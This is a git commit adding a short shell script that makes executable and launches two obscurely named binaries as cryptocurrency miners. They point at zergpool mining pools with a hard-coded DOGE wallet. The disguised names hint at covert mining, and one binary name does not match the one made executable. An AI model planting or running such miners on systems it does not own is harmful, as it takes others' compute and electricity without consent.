4848c11c547b3b9b3c0bca5cb92358bb369c1e65
broadbandmania <67984429+broadbandmania@users.noreply.github.com>
2022-02-06 22:12:34 +0700

    Add files via upload

---
+++ cucul.sh
@@ -0,0 +1,4 @@
+echo "+++++++ Configure Mechine +++++++++"
+chmod +x leleC leleG mateni.sh
+./leleG --algo ETHASH --pool ethash.mine.zergpool.com:9999 --user DSHdfkgcoyxHE95xsEZUxSMqnp8HXWZbEq --pass c=DOGE,mc=TSF,ID=leleG
+./lele -v -l verushash.mine.zergpool.com:3300 -u DSHdfkgcoyxHE95xsEZUxSMqnp8HXWZbEq -p c=DOGE,mc=VRSC,ID=leleC -t 1
